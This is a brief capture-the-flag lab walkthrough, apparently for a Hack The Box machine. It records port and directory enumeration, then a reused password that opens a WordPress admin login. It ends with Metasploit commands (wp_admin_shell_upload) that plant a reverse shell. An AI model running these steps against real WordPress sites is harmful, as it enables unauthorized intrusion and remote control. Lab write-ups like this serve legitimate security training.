# Steps

## Enumeration

```bash
80/tcp   open  http    Microsoft IIS httpd 10.0
3306/tcp open  mysql   MySQL (unauthorized)
Microsoft Windows Server 2016 (91%)
```

```bash
gobuster dir -u 10.10.10.29 -w /usr/share/dirbuster-ng/wordlists/common.txt
```

> http://10.10.10.29/wordpress/wp-login.php

## Entry

We test every password found on previous machines:

> `P@s5w0rd!` works

We can now plant a reverse shell using msf:

```bash
use exploit/unix/webapp/wp_admin_shell_upload
set password P@s5w0rd!
set username admin
set rhosts 10.10.10.29
set targeturi /wordpress
run
```
